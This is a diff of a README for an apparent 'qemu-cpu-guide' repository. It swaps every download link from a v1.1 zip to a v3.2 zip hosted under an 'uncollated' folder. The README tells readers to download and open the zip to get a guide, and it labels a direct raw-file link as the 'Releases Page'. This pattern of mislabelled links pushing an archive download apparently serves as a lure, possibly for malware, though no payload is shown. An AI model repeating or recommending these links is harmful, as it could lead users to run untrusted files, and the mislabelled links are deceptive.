@@ -1,7 +1,7 @@
 # 🚀 qemu-cpu-guide - Learn to Use QEMU CPU Models Easily
 
 ## 💻 Download Now
-[![Download qemu-cpu-guide](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v1.1.zip)](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v1.1.zip)
+[![Download qemu-cpu-guide](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v3.2.zip)](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v3.2.zip)
 
 ## 📖 Overview
 Welcome to the **qemu-cpu-guide** repository. This guide provides a detailed understanding of how to effectively use QEMU CPU models for KVM guests. With this guide, you can better manage virtualized environments, ensuring optimal performance and compatibility.
@@ -24,7 +24,7 @@ Follow these steps to download and run the qemu-cpu-guide:
 
 1. **Visit the Releases Page**:
    Click on the link below to access all available versions of the qemu-cpu-guide.
-   [Visit the Releases Page](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v1.1.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v3.2.zip)
 
 2. **Select the Version**:
    Choose the latest release or a specific version if needed. Each release contains the complete guide and instructions.
@@ -44,7 +44,7 @@ Follow these steps to download and run the qemu-cpu-guide:
 ## 📥 Download & Install
 You can download the latest version of qemu-cpu-guide from the Releases page. Ensure you have a stable internet connection for a smooth download.
 
-[Download qemu-cpu-guide](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v1.1.zip)
+[Download qemu-cpu-guide](https://raw.githubusercontent.com/Tanniefooted733/qemu-cpu-guide/main/uncollated/qemu-cpu-guide-v3.2.zip)
 
 Once you open the downloaded file, you will see detailed instructions and information to guide you through the setup process.
 
